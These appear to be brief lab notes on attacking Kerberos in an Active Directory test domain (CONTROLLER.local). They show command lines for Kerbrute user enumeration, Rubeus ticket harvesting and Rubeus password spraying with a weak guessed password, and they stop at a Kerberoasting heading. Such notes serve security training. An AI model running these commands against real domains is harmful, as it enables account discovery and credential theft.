## Enumeration w/ Kerbrute

- [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting & Brute-Forcing Tickets w/ Rubeus

```
`Rubeus.exe harvest /interval:30`
```

```
echo 10.10.97.145 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```


```
Rubeus.exe brute /password:Password1 /noticket
```

## Kerberoasting w/ Rubeus & Impacket